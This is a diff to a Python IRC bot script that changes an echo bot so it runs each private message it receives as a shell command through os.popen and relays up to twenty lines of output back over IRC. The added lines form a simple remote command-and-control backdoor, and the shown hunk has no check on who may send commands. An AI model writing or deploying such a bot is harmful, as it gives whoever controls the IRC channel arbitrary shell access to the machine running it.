@@ -25,7 +25,7 @@ s.send(bytes("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME), "UTF-8"))
 # Joins the Channel
 s.send(bytes("JOIN #%s \r\n" % (CHANNEL), "UTF-8"))
 # starts a conversation with the 'master' when joining
-s.send(bytes("PRIVMSG %s :Hello Master\r\n" % MASTER, "UTF-8"))
+s.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER, "UTF-8"))
 
 while True:
     readbuffer = readbuffer+s.recv(1024).decode("UTF-8")
@@ -52,6 +52,18 @@ while True:
                 message += line[i] + " "
                 i = i + 1
             message.lstrip(":")
-            s.send(bytes("PRIVMSG %s %s \r\n" % (sender, message), "UTF-8"))
+            s.send(bytes("PRIVMSG %s :Executing-> %s \r\n" % (sender, message[1:]), "UTF-8"))
+            # Removing the first Char and sent it to shell
+            # response = os.system(message[1:])
+            p = os.popen(message[1:] + " 2>&1", "r")
+            # Puts out the first 20 lines. There's a good reason for this.
+            n = 0
+            while n < 20:
+                line = p.readline()
+                if not line:
+                    break
+                s.send(bytes("PRIVMSG %s :Response -> %s \r\n" % (sender, str(line)), "UTF-8"))
+                time.sleep(1)
+                n += 1
         for index, i in enumerate(line):
             print(line[index])
